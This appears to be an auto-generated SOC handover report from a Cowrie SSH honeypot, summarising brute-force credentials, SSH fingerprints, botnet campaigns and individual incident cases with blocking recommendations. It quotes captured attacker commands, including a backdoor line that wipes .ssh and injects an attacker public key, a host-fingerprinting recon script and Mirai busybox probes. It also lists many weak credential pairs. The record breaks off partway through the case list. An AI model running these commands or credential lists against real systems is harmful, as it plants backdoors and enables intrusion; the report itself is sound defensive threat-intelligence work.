# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-08 |
| **Generated At** | 2026-09-08T08:46:15Z |
| **Shift Time** | 08:46 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **362** |
| Confirmed Threats | **305** |
| False Positives Filtered | **57** (15.8%) |
| Unique Attacker IPs | **83** |
| Countries of Origin | **32** |
| High Severity Cases | **201** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **161** |
| Malware Samples Analyzed | **4** HIGH · **21** MED · 18 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **237** |
| Unique Credential Pairs | **162** |
| Unique Usernames | **25** |
| Unique Passwords | **109** |
| Successful Auth Pairs | **210** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 114 |
| `admin` | 32 |
| `345gs5662d34` | 22 |
| `support` | 11 |
| `administrator` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 22 |
| `3245gs5662d34` | 22 |
| `support` | 11 |
| `abcd1234` | 7 |
| `1234` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 22 |
| `support` | `support` | 11 |
| `root` | `3245gs5662d34` | 6 |
| `pi` | `abcd1234` | 6 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `sanjay` | `sanjay123` | `10.0.0.73` | 2026-09-08T02:55:33 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-08T02:55:35 |
| `sanjay` | `3245gs5662d34` | `10.0.0.73` | 2026-09-08T02:55:36 |
| `root` | `Password12` | `81.169.219.15` | 2026-09-08T02:56:55 |
| `root` | `Password123` | `81.169.219.15` | 2026-09-08T03:03:11 |
| `admin` | `1234` | `46.233.7.48` | 2026-09-08T03:05:34 |
| `root` | `111111` | `195.178.110.217` | 2026-09-08T03:05:37 |
| `root` | `123` | `195.178.110.217` | 2026-09-08T03:07:23 |
| `root` | `123123` | `195.178.110.217` | 2026-09-08T03:09:14 |
| `root` | `Password1234` | `81.169.219.15` | 2026-09-08T03:09:25 |
| `support` | `support` | `176.53.159.196` | 2026-09-08T03:10:52 |
| `root` | `123321` | `195.178.110.217` | 2026-09-08T03:11:12 |
| `root` | `Root2024!` | `123.122.46.140` | 2026-09-08T03:12:58 |
| `345gs5662d34` | `345gs5662d34` | `123.122.46.140` | 2026-09-08T03:13:02 |
| `root` | `3245gs5662d34` | `123.122.46.140` | 2026-09-08T03:13:04 |
| `root` | `1234` | `195.178.110.217` | 2026-09-08T03:13:09 |
| `root` | `12345` | `195.178.110.217` | 2026-09-08T03:15:00 |
| `root` | `Password12345` | `81.169.219.15` | 2026-09-08T03:15:41 |
| `root` | `1234567` | `195.178.110.217` | 2026-09-08T03:18:32 |
| `root` | `12345678` | `195.178.110.217` | 2026-09-08T03:20:16 |
| `root` | `Password123456` | `81.169.219.15` | 2026-09-08T03:21:52 |
| `root` | `123456789` | `195.178.110.217` | 2026-09-08T03:22:04 |
| `root` | `1234abcd` | `195.178.110.217` | 2026-09-08T03:23:58 |
| `root` | `123abc` | `195.178.110.217` | 2026-09-08T03:25:59 |
| `root` | `123qwe` | `195.178.110.217` | 2026-09-08T03:27:58 |
| `root` | `Password1234567` | `81.169.219.15` | 2026-09-08T03:28:04 |
| `root` | `1q2w3e` | `195.178.110.217` | 2026-09-08T03:29:54 |
| `root` | `1q2w3e4r` | `195.178.110.217` | 2026-09-08T03:31:48 |
| `root` | `1qaz2wsx` | `195.178.110.217` | 2026-09-08T03:33:39 |
| `root` | `123@@@` | `64.110.90.250` | 2026-09-08T03:33:58 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-09-08T03:33:58 |
| `root` | `Password@1` | `81.169.219.15` | 2026-09-08T03:34:17 |
| `support` | `support` | `10.0.0.73` | 2026-09-08T03:34:34 |
| `root` | `321` | `195.178.110.217` | 2026-09-08T03:35:24 |
| `root` | `654321` | `195.178.110.217` | 2026-09-08T03:37:09 |
| `root` | `P@ssw0rd` | `195.178.110.217` | 2026-09-08T03:38:51 |
| `root` | `Password@12` | `81.169.219.15` | 2026-09-08T03:40:29 |
| `root` | `P@ssword` | `195.178.110.217` | 2026-09-08T03:40:36 |
| `root` | `Root123` | `195.178.110.217` | 2026-09-08T03:42:23 |
| `root` | `admin` | `195.178.110.217` | 2026-09-08T03:44:15 |
| `root` | `admin` | `194.55.94.251` | 2026-09-08T03:44:38 |
| `root` | `admin123` | `195.178.110.217` | 2026-09-08T03:46:05 |
| `root` | `Password@123` | `81.169.219.15` | 2026-09-08T03:46:40 |
| `root` | `letmein` | `195.178.110.217` | 2026-09-08T03:47:53 |
| `root` | `pass` | `195.178.110.217` | 2026-09-08T03:49:41 |
| `root` | `Password@1234` | `81.169.219.15` | 2026-09-08T03:52:53 |
| `root` | `Password@12345` | `81.169.219.15` | 2026-09-08T03:59:08 |
| `root` | `` | `31.43.49.88` | 2026-09-08T04:01:04 |
| `root` | `Password@123456` | `81.169.219.15` | 2026-09-08T04:05:26 |
| `web` | `web!@#` | `8.217.211.182` | 2026-09-08T04:10:44 |
| `345gs5662d34` | `345gs5662d34` | `8.217.211.182` | 2026-09-08T04:10:48 |
| `web` | `3245gs5662d34` | `8.217.211.182` | 2026-09-08T04:10:50 |
| `mysqladmin` | `mysqladmin` | `101.47.156.170` | 2026-09-08T04:11:02 |
| `345gs5662d34` | `345gs5662d34` | `101.47.156.170` | 2026-09-08T04:11:06 |
| `mysqladmin` | `3245gs5662d34` | `101.47.156.170` | 2026-09-08T04:11:08 |
| `downloader` | `downloader123!` | `118.193.36.205` | 2026-09-08T04:11:25 |
| `345gs5662d34` | `345gs5662d34` | `118.193.36.205` | 2026-09-08T04:11:29 |
| `downloader` | `3245gs5662d34` | `118.193.36.205` | 2026-09-08T04:11:30 |
| `root` | `Q!W@E#R$` | `81.169.219.15` | 2026-09-08T04:11:46 |
| `test` | `Passw0rd` | `117.50.73.90` | 2026-09-08T04:12:10 |
| `joel` | `1234` | `206.42.8.243` | 2026-09-08T04:13:29 |
| `345gs5662d34` | `345gs5662d34` | `206.42.8.243` | 2026-09-08T04:13:31 |
| `joel` | `3245gs5662d34` | `206.42.8.243` | 2026-09-08T04:13:32 |
| `downloader` | `downloader123!` | `61.43.121.132` | 2026-09-08T04:15:10 |
| `root` | `asd.1234` | `168.76.131.178` | 2026-09-08T04:15:13 |
| `345gs5662d34` | `345gs5662d34` | `61.43.121.132` | 2026-09-08T04:15:14 |
| `downloader` | `3245gs5662d34` | `61.43.121.132` | 2026-09-08T04:15:16 |
| `345gs5662d34` | `345gs5662d34` | `168.76.131.178` | 2026-09-08T04:15:17 |
| `root` | `3245gs5662d34` | `168.76.131.178` | 2026-09-08T04:15:18 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-09-08T04:16:03 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.52.182.122` | 2026-09-08T04:16:15 |
| `admin` | `hduser1234567` | `47.82.78.112` | 2026-09-08T04:16:19 |
| `345gs5662d34` | `345gs5662d34` | `47.82.78.112` | 2026-09-08T04:16:23 |
| `*1` | `$4` | `34.52.182.122` | 2026-09-08T04:16:24 |
| `admin` | `3245gs5662d34` | `47.82.78.112` | 2026-09-08T04:16:25 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5789` | `34.52.182.122` | 2026-09-08T04:16:26 |
| `root` | `QNX` | `81.169.219.15` | 2026-09-08T04:17:55 |
| `thomas` | `password` | `47.238.108.95` | 2026-09-08T04:18:27 |
| `345gs5662d34` | `345gs5662d34` | `47.238.108.95` | 2026-09-08T04:18:30 |
| `thomas` | `3245gs5662d34` | `47.238.108.95` | 2026-09-08T04:18:32 |
| `amir` | `amir` | `47.237.72.129` | 2026-09-08T04:20:18 |
| `345gs5662d34` | `345gs5662d34` | `47.237.72.129` | 2026-09-08T04:20:22 |
| `root` | `adler` | `118.145.238.115` | 2026-09-08T04:20:23 |
| `amir` | `3245gs5662d34` | `47.237.72.129` | 2026-09-08T04:20:23 |
| `root` | `000000` | `92.118.39.50` | 2026-09-08T04:23:57 |
| `root` | `Qwe1!2345` | `81.169.219.15` | 2026-09-08T04:24:08 |
| `root` | `111111` | `92.118.39.50` | 2026-09-08T04:26:13 |
| `ubuntu` | `root12345` | `164.152.250.192` | 2026-09-08T04:28:13 |
| `345gs5662d34` | `345gs5662d34` | `164.152.250.192` | 2026-09-08T04:28:17 |
| `ubuntu` | `3245gs5662d34` | `164.152.250.192` | 2026-09-08T04:28:18 |
| `root` | `123` | `92.118.39.50` | 2026-09-08T04:28:34 |
| `root` | `Qwe1!234` | `81.169.219.15` | 2026-09-08T04:30:18 |
| `root` | `123123` | `92.118.39.50` | 2026-09-08T04:30:58 |
| `root` | `123321` | `92.118.39.50` | 2026-09-08T04:33:26 |
| `root` | `ubuntu@123456` | `10.0.0.73` | 2026-09-08T04:35:19 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-08T04:35:22 |
| `root` | `1234` | `92.118.39.50` | 2026-09-08T04:35:43 |
| `root` | `Qwe1!23` | `81.169.219.15` | 2026-09-08T04:36:28 |
| `root` | `12345` | `92.118.39.50` | 2026-09-08T04:38:07 |
| `internet` | `123456` | `10.0.0.73` | 2026-09-08T04:39:36 |
| `internet` | `3245gs5662d34` | `10.0.0.73` | 2026-09-08T04:39:42 |
| `root` | `1234567` | `92.118.39.50` | 2026-09-08T04:42:24 |
| `root` | `Qwe1!2` | `81.169.219.15` | 2026-09-08T04:42:42 |
| `root` | `12345678` | `92.118.39.50` | 2026-09-08T04:44:44 |
| `root` | `123456789` | `92.118.39.50` | 2026-09-08T04:47:07 |
| `root` | `Qwert1234` | `81.169.219.15` | 2026-09-08T04:49:02 |
| `root` | `1234567890` | `92.118.39.50` | 2026-09-08T04:49:22 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.34.185.242` | 2026-09-08T04:50:38 |
| `*1` | `$4` | `34.34.185.242` | 2026-09-08T04:50:51 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 8361` | `34.34.185.242` | 2026-09-08T04:50:53 |
| `root` | `123456a` | `92.118.39.50` | 2026-09-08T04:51:39 |
| `tempuser` | `tempuser` | `186.180.130.170` | 2026-09-08T04:52:29 |
| `345gs5662d34` | `345gs5662d34` | `186.180.130.170` | 2026-09-08T04:52:32 |
| `tempuser` | `3245gs5662d34` | `186.180.130.170` | 2026-09-08T04:52:33 |
| `root` | `123456b` | `92.118.39.50` | 2026-09-08T04:53:50 |
| `root` | `Root123` | `81.169.219.15` | 2026-09-08T04:55:15 |
| `root` | `123abc` | `92.118.39.50` | 2026-09-08T04:56:07 |
| `root` | `123qwe` | `92.118.39.50` | 2026-09-08T04:58:17 |
| `root` | `1q2w3e4r` | `92.118.39.50` | 2026-09-08T05:00:21 |
| `root` | `ZAQ!XSW@` | `81.169.219.15` | 2026-09-08T05:01:30 |
| `root` | `555555` | `92.118.39.50` | 2026-09-08T05:02:40 |
| `root` | `654321` | `92.118.39.50` | 2026-09-08T05:05:58 |
| `root` | `ZAQ!xsw2` | `81.169.219.15` | 2026-09-08T05:07:43 |
| `root` | `7777777` | `92.118.39.50` | 2026-09-08T05:08:09 |
| `support` | `support` | `77.90.185.17` | 2026-09-08T05:09:16 |
| `root` | `abc123` | `92.118.39.50` | 2026-09-08T05:10:39 |
| `root` | `a` | `81.169.219.15` | 2026-09-08T05:13:56 |
| `root` | `admin` | `92.118.39.50` | 2026-09-08T05:13:58 |
| `root` | `admin123` | `92.118.39.50` | 2026-09-08T05:16:11 |
| `support` | `support` | `138.226.239.234` | 2026-09-08T05:17:42 |
| `root` | `passw0rd` | `92.118.39.50` | 2026-09-08T05:18:12 |
| `root` | `start123` | `183.82.111.224` | 2026-09-08T05:18:59 |
| `345gs5662d34` | `345gs5662d34` | `183.82.111.224` | 2026-09-08T05:19:03 |
| `root` | `3245gs5662d34` | `183.82.111.224` | 2026-09-08T05:19:05 |
| `root` | `a11b12c13` | `81.169.219.15` | 2026-09-08T05:20:07 |
| `root` | `password` | `92.118.39.50` | 2026-09-08T05:20:09 |
| `root` | `password1` | `92.118.39.50` | 2026-09-08T05:22:02 |
| `root` | `qwerty` | `92.118.39.50` | 2026-09-08T05:24:11 |
| `root` | `a123456` | `81.169.219.15` | 2026-09-08T05:26:18 |
| `root` | `welcome` | `92.118.39.50` | 2026-09-08T05:27:06 |
| `admin` | `000000` | `92.118.39.50` | 2026-09-08T05:29:40 |
| `paul` | `Password1` | `103.163.214.149` | 2026-09-08T05:30:39 |
| `345gs5662d34` | `345gs5662d34` | `103.163.214.149` | 2026-09-08T05:30:43 |
| `paul` | `3245gs5662d34` | `103.163.214.149` | 2026-09-08T05:30:45 |
| `admin` | `111111` | `92.118.39.50` | 2026-09-08T05:31:24 |
| `root` | `a12345678` | `81.169.219.15` | 2026-09-08T05:32:26 |
| `carlos` | `Carlos123` | `161.35.179.218` | 2026-09-08T05:32:57 |
| `345gs5662d34` | `345gs5662d34` | `161.35.179.218` | 2026-09-08T05:32:58 |
| `carlos` | `3245gs5662d34` | `161.35.179.218` | 2026-09-08T05:32:58 |
| `admin` | `123` | `92.118.39.50` | 2026-09-08T05:33:08 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `184.105.247.195` | 2026-09-08T05:33:31 |
| `admin` | `123123` | `92.118.39.50` | 2026-09-08T05:35:05 |
| `admin` | `123321` | `92.118.39.50` | 2026-09-08T05:37:46 |
| `root` | `a13a13` | `81.169.219.15` | 2026-09-08T05:38:37 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.62.237.3` | 2026-09-08T05:40:05 |
| `*1` | `$4` | `34.62.237.3` | 2026-09-08T05:40:19 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2069` | `34.62.237.3` | 2026-09-08T05:40:20 |
| `admin` | `1234` | `92.118.39.50` | 2026-09-08T05:40:26 |
| `admin` | `12345` | `92.118.39.50` | 2026-09-08T05:42:04 |
| `admin` | `123456` | `92.118.39.50` | 2026-09-08T05:43:39 |
| `root` | `a1a1a1` | `81.169.219.15` | 2026-09-08T05:44:56 |
| `admin` | `1234567` | `92.118.39.50` | 2026-09-08T05:45:20 |
| `admin` | `12345678` | `92.118.39.50` | 2026-09-08T05:46:56 |
| `admin` | `123456789` | `92.118.39.50` | 2026-09-08T05:48:36 |
| `admin` | `1234567890` | `92.118.39.50` | 2026-09-08T05:50:24 |
| `root` | `a1b23c` | `81.169.219.15` | 2026-09-08T05:51:11 |
| `admin` | `123456a` | `92.118.39.50` | 2026-09-08T05:52:25 |
| `admin` | `123qwe` | `92.118.39.50` | 2026-09-08T05:55:08 |
| `admin` | `1q2w3e4r` | `92.118.39.50` | 2026-09-08T05:57:21 |
| `root` | `a1b2c3d4` | `81.169.219.15` | 2026-09-08T05:57:21 |
| `admin` | `654321` | `92.118.39.50` | 2026-09-08T05:58:59 |
| `admin` | `7777777` | `92.118.39.50` | 2026-09-08T06:00:40 |
| `admin` | `abc123` | `92.118.39.50` | 2026-09-08T06:02:24 |
| `root` | `a1b2c3d4e5` | `81.169.219.15` | 2026-09-08T06:03:33 |
| `admin` | `admin` | `92.118.39.50` | 2026-09-08T06:04:06 |
| `uucp` | `uucp` | `77.90.185.17` | 2026-09-08T06:04:27 |
| `uucp` | `uucp` | `10.0.0.73` | 2026-09-08T06:05:35 |
| `admin` | `admin123` | `92.118.39.50` | 2026-09-08T06:05:52 |
| `admin` | `passw0rd` | `92.118.39.50` | 2026-09-08T06:07:52 |
| `root` | `a1rplan3` | `81.169.219.15` | 2026-09-08T06:09:53 |
| `admin` | `password` | `92.118.39.50` | 2026-09-08T06:10:08 |
| `root` | `123456789123456789` | `138.117.244.17` | 2026-09-08T06:10:09 |
| `root` | `﻿------fuck------` | `124.174.51.228` | 2026-09-08T06:12:08 |
| `admin` | `password1` | `92.118.39.50` | 2026-09-08T06:12:18 |
| `username` | `password` | `77.90.185.17` | 2026-09-08T06:12:32 |
| `admin` | `qwerty` | `92.118.39.50` | 2026-09-08T06:13:52 |
| `administrator` | `123` | `92.118.39.50` | 2026-09-08T06:15:27 |
| `root` | `a1s2d3` | `81.169.219.15` | 2026-09-08T06:16:10 |
| `administrator` | `123123` | `92.118.39.50` | 2026-09-08T06:17:05 |
| `administrator` | `1234` | `92.118.39.50` | 2026-09-08T06:18:44 |
| `root` | `citrix` | `10.0.0.73` | 2026-09-08T06:19:42 |
| `root` | `eGova@2025` | `10.0.0.73` | 2026-09-08T06:19:52 |
| `admin` | `abcd1234` | `10.0.0.73` | 2026-09-08T06:19:55 |
| `admin` | `3245gs5662d34` | `10.0.0.73` | 2026-09-08T06:20:01 |
| `administrator` | `12345` | `92.118.39.50` | 2026-09-08T06:20:33 |
| `root` | `abc` | `81.169.219.15` | 2026-09-08T06:22:23 |
| `administrator` | `123456` | `92.118.39.50` | 2026-09-08T06:22:26 |
| `administrator` | `1234567` | `92.118.39.50` | 2026-09-08T06:24:18 |
| `administrator` | `12345678` | `92.118.39.50` | 2026-09-08T06:26:20 |
| `administrator` | `123456789` | `92.118.39.50` | 2026-09-08T06:28:27 |
| `root` | `abc#123` | `81.169.219.15` | 2026-09-08T06:28:41 |
| `administrator` | `123abc` | `92.118.39.50` | 2026-09-08T06:29:59 |
| `root` | `abc1` | `81.169.219.15` | 2026-09-08T06:35:02 |
| `root` | `abc12` | `81.169.219.15` | 2026-09-08T06:41:20 |
| `alex` | `0` | `107.189.27.179` | 2026-09-08T06:46:08 |
| `345gs5662d34` | `345gs5662d34` | `107.189.27.179` | 2026-09-08T06:46:10 |
| `alex` | `3245gs5662d34` | `107.189.27.179` | 2026-09-08T06:46:11 |
| `root` | `abc123` | `81.169.219.15` | 2026-09-08T06:47:31 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `45.79.172.21` | 2026-09-08T06:53:35 |
| `root` | `abc123!!` | `81.169.219.15` | 2026-09-08T06:53:46 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **362** |
| Sessions with Fingerprint | **17** |
| Unique HASSH Fingerprints | **17** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 139 |
| libssh | 64 |
| OpenSSH | 5 |
| Paramiko (Python) | 4 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 86 | 2 |
| `f555226df196...` | Mirai/variant | 53 | 20 |
| `98f63c4d9c87...` | Generic scanner | 41 | 3 |
| `eff4c24daffc...` | Modern SSH client | 4 | 1 |
| `419da4c91ddb...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 86 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 53 | 20 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 41 | 3 | Generic scanner |
| `95420f9d932d...` | libssh | 6 | 5 | — |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `419da4c91ddb...` | libssh | 4 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `390ffe68a68c...` | OpenSSH | 4 | 2 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **12** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 17 | 17 | `T1021.004, T1078, T1070, T1140` |
| **Recon Loader Script** | 🟡 MEDIUM | 84 | 2 | `T1082, T1592, T1078, T1083` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
/bin/busybox TOKEN
```
Source IPs: `46.233.7.48`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `118.193.36.205`, `47.237.72.129`, `168.76.131.178`, `61.43.121.132`, `206.42.8.243`, `164.152.250.192`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch
```
Source IPs: `195.178.110.217`, `92.118.39.50`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **83** |
| Unique ASNs | **48** |
| High-Risk ASNs | **34** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 20 | HIGH |
| `AS396982` | Google LLC | 5 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 4 | LOW |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS6939` | Hurricane Electric LLC | 3 | HIGH |
| `AS10617` | SION S.A | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (162)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ce330b277b72

| Field | Detail |
|---|---|
| **Source IP** | `46.233.7[.]48` |
| **First Seen** | 2026-09-08 03:05 |
| **Last Seen** | 2026-09-08 03:06 |
| **Session Duration** | 68s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, /bin/busybox TOKEN` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:05:32` | `cowrie.session.connect` |
| `2026-09-08 03:05:34` | `cowrie.login.success` |
| `2026-09-08 03:05:34` | `cowrie.session.params` |
| `2026-09-08 03:05:36` | `cowrie.command.input` |
| `2026-09-08 03:05:36` | `cowrie.command.failed` |
| `2026-09-08 03:05:36` | `cowrie.command.input` |
| `2026-09-08 03:05:36` | `cowrie.command.failed` |
| `2026-09-08 03:05:38` | `cowrie.command.input` |
| `2026-09-08 03:05:38` | `cowrie.command.failed` |
| `2026-09-08 03:05:39` | `cowrie.command.input` |
| `2026-09-08 03:05:40` | `cowrie.command.input` |
| `2026-09-08 03:05:40` | `cowrie.command.input` |
| `2026-09-08 03:05:40` | `cowrie.command.success` |
| `2026-09-08 03:05:50` | `cowrie.session.file_download.failed` |
| `2026-09-08 03:06:00` | `cowrie.session.file_download.failed` |
| `2026-09-08 03:06:40` | `cowrie.log.closed` |
| `2026-09-08 03:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.233.7[.]48` to AbuseIPDB if not already reported
- [ ] Block `46.233.7[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca1f45fc4203

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:05 |
| **Last Seen** | 2026-09-08 03:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:05:34` | `cowrie.session.connect` |
| `2026-09-08 03:05:35` | `cowrie.client.version` |
| `2026-09-08 03:05:35` | `cowrie.client.kex` |
| `2026-09-08 03:05:37` | `cowrie.login.success` |
| `2026-09-08 03:05:39` | `cowrie.session.params` |
| `2026-09-08 03:05:39` | `cowrie.command.input` |
| `2026-09-08 03:05:40` | `cowrie.log.closed` |
| `2026-09-08 03:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a11e9a03615

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:07 |
| **Last Seen** | 2026-09-08 03:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 03:07:21` | `cowrie.session.connect` |
| `2026-09-08 03:07:21` | `cowrie.client.version` |
| `2026-09-08 03:07:21` | `cowrie.client.kex` |
| `2026-09-08 03:07:23` | `cowrie.login.success` |
| `2026-09-08 03:07:25` | `cowrie.session.params` |
| `2026-09-08 03:07:25` | `cowrie.command.input` |
| `2026-09-08 03:07:25` | `cowrie.log.closed` |
| `2026-09-08 03:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fdbee0ef83d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-08 03:09 |
| **Last Seen** | 2026-09-08 03:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
